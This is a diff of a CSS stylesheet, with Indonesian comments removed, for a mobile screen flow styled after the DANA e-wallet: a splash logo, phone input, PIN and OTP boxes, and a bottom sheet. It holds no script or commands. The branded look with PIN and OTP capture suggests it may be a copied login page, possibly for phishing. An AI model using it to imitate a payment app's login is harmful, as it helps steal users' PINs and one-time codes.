@@ -19,7 +19,6 @@ body {
   min-height: 100vh;
 }
 
-/* Container Layar Smartphone */
 .app-container {
   position: relative;
   width: 100%;
@@ -39,7 +38,6 @@ body {
   }
 }
 
-/* Master Screens Layout */
 .screen {
   position: absolute;
   top: 0;
@@ -60,7 +58,6 @@ body {
   display: none !important;
 }
 
-/* 1. Splash Screen dengan Efek Memudar Saja */
 .splash-screen {
   background-color: var(--dana-blue);
   display: flex;
@@ -87,7 +84,7 @@ body {
 }
 
 .logo-dana {
-    width:180px; 
+    width: 200px; 
     margin-bottom:70px;
 }
 
@@ -97,43 +94,42 @@ body {
 }
 
 .footimg { 
-		   color: white;
-		   width: 500px;
-    height: 60px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: fixed;
-    bottom: 40px;
-    z-index: 99999;
+  color: white;
+  width: 500px;
+  height: 60px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: fixed;
+  bottom: 40px;
+  z-index: 99999;
 }
 
 .footimg img {
-	   	min-height: 40px;
-    max-height: 40px;
-    height: 40px;
-    margin: 0 8px 0 0;
+  min-height: 40px;
+  max-height: 40px;
+  height: 40px;
+  margin: 0 8px 0 0;
 }
 
 .footimg p {
-		   font-size: 10px;
-    white-space: nowrap;
+  font-size: 10px;
+  white-space: nowrap;
 }
 
-/* 2. Loading Overlay Spinner berlogo D di tengah */
 .loading-overlay {
   width: 100%;
-		 height: 100%;
-		 display: flex;
-		 justify-content: center;
-		 margin: auto;
-		 position: absolute;
-		 padding-top: 300px;
-		 left: 0;
-		 right: 0;
-		 bottom: 0;
-		 background: rgba(0, 0, 0, 0.6);
-		 z-index: 9999;
+  height: 100%;
+  display: flex;
+  justify-content: center;
+  margin: auto;
+  position: absolute;
+  padding-top: 300px;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.6);
+  z-index: 9999;
 }
 
 .spinner-box {
@@ -151,7 +147,6 @@ body {
   border-radius: 50%;
   object-fit: cover;
   position: absolute;
-  
   animation: spinPhoto 1.5s linear infinite; 
 }
 
@@ -167,7 +162,6 @@ body {
   100% { transform: rotate(0deg); }
 }
 
-/* Logo Di Atas Tengah Halaman */
 .top-logo-container {
   display: flex;
   justify-content: center;
@@ -177,16 +171,16 @@ body {
   width: 100%;
 }
 
-/* Form Body & Teks */
 .form-body {
-  padding: 24px;
+  padding: 24px 24px 100px 24px;
   flex: 1;
+  overflow-y: auto;
 }
 
 .text-center { text-align: center; margin-top: -20px; }
 
 .main-title {
-		 text-align: center;
+  text-align: center;
   font-size: 15px;
   color: #FFFFFF;
   line-height: 1.4;
@@ -194,12 +188,12 @@ body {
 }
 
 .subtitle {
-		 text-align: center;
+  text-align: center;
   width: 100%;
-		 margin-top: 40px;
-		 margin-bottom: 75px;
-		 font-size: 13px;
-		 text-align: center;
+  margin-top: 40px;
+  margin-bottom: 75px;
+  font-size: 13px;
+  text-align: center;
 }
 
 .input-wrapper {
@@ -213,9 +207,9 @@ body {
 }
 
 .input-wrapper:focus-within {
-  border-color: var(--border-color); /* Warna border tetap tenang/tidak berubah */
-  box-shadow: none !important;        /* Hilangkan bayangan kilat total */
-  outline: none !important;           /* Hilangkan outline bawaan browser */
+  border-color: var(--border-color);
+  box-shadow: none !important;
+  outline: none !important;
 }
 
 .country-box {
@@ -233,7 +227,7 @@ body {
 
 .code {
   font-weight: 500;
-  color: #333333; /* Warna gelap agar kontras di box putih */
+  color: #333333;
   font-size: 1rem;
 }
 
@@ -245,7 +239,7 @@ body {
   padding-left: 14px;
   font-size: 1.15rem;
   font-weight: 700;
-  color: #333333; /* Warna gelap agar kontras di box putih */
+  color: #333333;
   letter-spacing: 0.5px;
 }
 
@@ -253,9 +247,17 @@ body {
   color: #A0A6B0;
 }
 
-/* Tombol Putih Kontras */
 .footer-action {
-  padding: 24px;
+  position: fixed;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  max-width: 412px;
+  padding: 8px 24px;
+  background: transparent;
+  pointer-events: none;
+  z-index: 999;
 }
 
 .btn-primary {
@@ -264,20 +266,22 @@ body {
   color: #FFFFFF;
   border: none;
   border-radius: 26px;
-  padding: 100px;
+  padding: 14px;
   font-size: 1rem;
   font-weight: 600;
   cursor: pointer;
-  transition: background-color 0.2s;
+  box-shadow: none;
+  pointer-events: auto;
+  transition: opacity 0.2s;
 }
 
 .btn-primary:disabled {
-  background-color: rgba(255, 255, 255, 0.0);
+  background-color: transparent;
   color: rgba(255, 255, 255, 0.3);
   cursor: not-allowed;
+  box-shadow: none;
 }
 
-/* Kotak PIN & OTP Putih Bersih */
 .otp-container {
   display: flex;
   justify-content: center;
@@ -303,13 +307,13 @@ body {
   outline: none;
   background: #FFFFFF;
   color: #333333;
-  transition: none; /* Hilangkan efek transisi pendaran */
+  transition: none;
 }
 
 .pin-field:focus {
-  border-color: var(--border-color); /* Tetap gunakan warna border asli */
-  box-shadow: none !important;        /* Hilangkan bayangan kilat total */
-  outline: none !important;           /* Hilangkan outline bawaan browser */
+  border-color: var(--border-color);
+  box-shadow: none !important;
+  outline: none !important;
 }
 
 .otp-field {
@@ -321,15 +325,15 @@ body {
   border: 1px solid var(--border-color);
   border-radius: 8px;
   outline: none;
-  background: #FFFFFF; /* Tetap putih bersih */
+  background: #FFFFFF;
   color: #333333;
   transition: all 0.15s;
 }
 
 .otp-field:focus {
-  border-color: var(--border-color); /* Tetap gunakan warna border asli */
-  box-shadow: none !important;        /* Hilangkan bayangan kilat total */
-  outline: none !important;           /* Hilangkan outline bawaan browser */
+  border-color: var(--border-color);
+  box-shadow: none !important;
+  outline: none !important;
 }
 
 .forgot-link {
@@ -340,7 +344,6 @@ body {
   opacity: 0.9;
 }
 
-/* Master Bottom Sheet Container (Disembunyikan total di awal) */
 .bottom-sheet {
   position: absolute;
   top: 0;
@@ -351,9 +354,8 @@ body {
   pointer-events: none;
 }
 
-/* KETIKA DIKASIH KELAS SHOW (Bottom sheet aktif & mulai beranimasi naik) */
 .bottom-sheet.show {
-  display: block !important; /* Memaksa elemen tampil kembali */
+  display: block !important;
   pointer-events: auto;
 }
 
@@ -370,7 +372,7 @@ body {
 
 .bottom-sheet .sheet-content {
   position: absolute;
-  bottom: -100%; /* Berada jauh di bawah layar */
+  bottom: -100%;
   left: 0;
   width: 100%;
   background: #FFFFFF;
@@ -380,13 +382,12 @@ body {
   z-index: 2;
 }
 
-/* Efek transisi naik dari bawah */
 .bottom-sheet.show .sheet-backdrop {
   opacity: 1;
 }
 
 .bottom-sheet.show .sheet-content {
-  bottom: 0; /* Bergeser mulus naik ke posisi atas */
+  bottom: 0;
 }
 
 .sheet-handle {
@@ -423,5 +424,4 @@ body {
 .countdown-text span {
   color: var(--dana-blue);
   font-weight: 700;
-    }
-  
+}
